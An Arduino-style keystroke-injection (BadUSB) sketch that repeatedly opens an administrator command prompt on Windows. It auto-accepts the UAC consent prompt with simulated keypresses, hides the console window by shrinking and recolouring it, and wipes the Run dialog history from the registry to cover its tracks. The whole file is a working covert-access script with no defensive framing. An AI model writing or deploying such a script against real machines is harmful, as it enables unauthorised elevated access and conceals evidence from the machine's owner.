#include <Keyboard.h>

Keyboard kb;


void setup()
{  
    Serial.begin(9600);  
    delay(1000);
}


void loop()
{
  //open cmd as administrator
  kb.WINDOWS("r");
  kb.DELAY(500);   
  kb.STRING("powershell Start-Process cmd -Verb runAs");
  kb.ENTER(); 
  kb.DELAY(2000);
  kb.ALT("y");
  kb.DELAY(500); 
  kb.ALT("s");
  kb.DELAY(500); 
  kb.BACKSPACE();
  kb.DELAY(1000); 
  
  // obfuscate the command prompt 
  kb.STRING("mode con:cols=18 lines=1");
  kb.ENTER(); 
  kb.STRING("color FE");
  kb.ENTER(); 
  
  // clear the Run history and exit
  kb.STRING("powershell Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Name * -ErrorAction SilentlyContinue");
  kb.ENTER(); 
  kb.STRING("exit");
  kb.ENTER(); 
    
  kb.DELAY(300000); 
}



